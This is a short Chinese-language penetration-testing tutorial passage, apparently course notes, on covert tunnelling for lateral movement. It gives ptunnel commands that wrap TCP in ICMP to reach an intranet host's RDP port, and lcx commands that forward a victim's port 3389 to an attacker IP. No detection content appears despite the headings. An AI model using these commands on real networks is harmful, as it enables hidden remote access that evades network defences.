### 案例2-网络层ICMP隧道ptunnel使用-检测,利用
```
kali2020-Target2-Target3
pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具
-p  ##表示连接icmp隧道另一端的机器IP（即目标服务器）
-lp ##表示需要监听的本地tcp端口
-da ##指定需要转发的机器的IP（即目标内网某一机器的内网IP）
-dp ##指定需要转发的机器的端口（即目标内网某一机器的内网端口）
-x  ##设置连接的密码
Webserver：./ptunnel -x xiaodi
Hacker xiaodi：./ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi #转发的3389请求数据给本地1080
Hacker xiaodi：rdesktop 127.0.0.1 1080
老版本介绍：https://github.com/f1vefour/ptunnel(需自行编译)
新版本介绍：https://github.com/esrrhs/pingtunnel(二次开发版)
```

### 案例3-传输层转发隧道Portmap使用-检测,利用
```
windows: lcx 
linux：portmap
lcx -slave 攻击IP 3131 127.0.0.1 3389 //将本地3389给攻击IP的3131
lcx -listen 3131 3333 //监听3131转发至3333
```